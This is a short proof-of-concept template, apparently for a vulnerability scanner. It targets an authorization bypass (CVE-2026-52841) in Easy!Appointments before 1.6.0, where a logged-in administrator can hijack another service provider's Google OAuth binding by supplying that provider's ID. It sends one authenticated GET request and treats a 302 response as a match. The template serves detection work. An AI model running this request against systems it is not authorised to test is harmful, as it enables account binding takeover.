[info]
author = "ave"
description = "验证 Easy!Appointments 1.6.0 之前版本中 Google::oauth 方法未校验调用者是否拥有目标 provider_id 的授权绕过漏洞。已登录管理员可传入任意服务提供者的 provider_id 劫持其 Google OAuth 绑定。"
id = "POC-AVE-2026-0759"
name = "Easy!Appointments Google OAuth Authorization Bypass PoC"
severity = "low"
tags = ["ave-2026-0759"]
vuln_id = [
    "CVE-2026-52841",
    "AVE-2026-0759",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/google/oauth/2"
protocol = "http"

[poc.requests.headers]
Cookie = "ea_session={{session}}"
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [302]
type = "status"
